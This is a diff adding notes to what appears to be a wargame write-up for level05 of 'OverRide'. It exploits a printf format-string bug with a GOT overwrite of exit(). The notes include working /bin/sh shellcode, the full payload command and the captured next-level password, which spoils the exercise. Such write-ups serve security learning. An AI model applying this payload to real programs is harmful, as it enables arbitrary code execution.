@@ -455,3 +455,76 @@ binary reads input into a 100 character buffer
 0x08048466 <+34>:    mov    DWORD PTR [esp+0x4],0x64
 ```
 then checks if each character is lowercase if it isn't it does a XOR character with 0x20, so I guess we cant inject shellcode
+
+and of course a fucking exit and not a RET, kill me
+## options
+change call to exit in GOT
+
+another option i dk, use printf to return to main?
+```
+(gdb) r <<< $(python -c "print 'AAAA' + '%p ' * 15")
+aaaa0x64 0xf7fcfac0 0xf7ec3af9 0xffffd6cf 0xffffd6ce (nil) 0xffffffff 0xffffd754 (nil) 0x61616161 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
+```
+so offset is 10
+## GOT OVEWRITE
+vulnerability in printf()
+```
+   0x08048500 <+188>:   lea    eax,[esp+0x28]
+   0x08048504 <+192>:   mov    DWORD PTR [esp],eax
+   0x08048507 <+195>:   call   0x8048340 <printf@plt>
+
+```
+format vuln as printf doesnt take any format strings as args, just printf(buffer);
+
+so memory can be dumped with format strings as input
+```
+(gdb) r <<< "AAAA%p %p %p"
+aaaa0x64 0xf7fcfac0 0xf7ec3af9
+```
+with exit(0) though, the program never returns. so we need to stop it from exiting.
+
+because **GOT** is writable, and whenever these functions(like exit(), printf(), etc.) are called, GOT entry of respective function is looked up first, then program counter jumps to that address.
+
+What if we modify the GOT entry of a function with format strings. Whenever that function will be called, the program counter will go to the modified GOT entry.
+
+### exit() to main()
+```
+(gdb) info functions main
+0x08048444  main
+```
+address is **134513732** in decimal, It means we will need to print 134513732 bytes to get to **0x08048444**. pretty fucking useless
+
+#### divide address into parts
+First we will use %p to print **0x44** thats **68 bytes** and a %n pointing to exit@got.plt then for the rest **0x8048** whichh is **32840 bytes** we neeed **(32840 - 68 = 32772)** bytes, more with %p and then next "%n" at (exit@got.plt+1) address. And finally there will be address of exit@got.plt and exit@got.plt+1 in payload so that we can make %n point to it.
+
+```
+(gdb) info function exit
+0x08048370  exit
+
+(gdb) x/i 0x08048370
+   0x8048370 <exit@plt>:        jmp    DWORD PTR ds:0x80497e0
+```
+address of exit in the GOT is **0x80497e0**
+
+now we need the address of our shellcode
+```
+level05@OverRide:~$export SHELLCODE=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
+
+level05@OverRide:~$gdb level05
+(gdb)x/500s $esp
+```
+so the address of shellcode is too fucking long, so needs to be split into two **0xffffdc59** = **0xffffdc59**
+
+**0xdc59** = 56409 - 4 - 4, for two exit addresses
+
+```
+(python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56401d"+"%10$hn"+"%9126d"+"%11$hn"';cat) | env -i PAYLOAD=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./level05
+```
+
+```
+cat /home/users/level06/.pass        
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
+level05@OverRide:~$ su level06
+Password:h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+```
